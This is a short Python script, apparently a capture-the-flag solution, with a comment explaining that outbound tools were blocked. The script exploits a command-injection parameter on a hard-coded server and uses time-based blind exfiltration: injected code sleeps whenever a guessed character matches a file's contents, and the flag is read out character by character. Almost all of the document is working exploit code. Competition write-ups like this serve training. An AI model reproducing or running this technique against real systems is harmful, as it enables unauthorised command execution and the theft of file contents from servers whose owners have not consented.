'''
We were able to get the server to sleep with the bash sleep command but were unable to send/receive any information to/from the server with the likes of netcat, telnet, wget, curl, etc. This led us to believe that a firewall was in place. As a result, we wrote a script to iterate through the ascii character set and sleep when the character in the flag text file was a match.
'''
from requests.utils import quote
import time
import unirest
from time import sleep
import string

SLEEP_TIME=1.5
ans = 'flag{'
characters = string.ascii_letters + string.digits

for index in range(1, 100):
	for letter in characters:
		cmd = '''
		python -c "__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)"
	  		'''.format(SLEEP_TIME, index, letter)

		start = time.time()
		response = unirest.get("http://54.89.146.217/?cmd={}".format(quote(cmd, safe='')))
		end = time.time()
		elapsed = end - start

		if elapsed > SLEEP_TIME:
			ans += letter
			print ans + '}'
			break
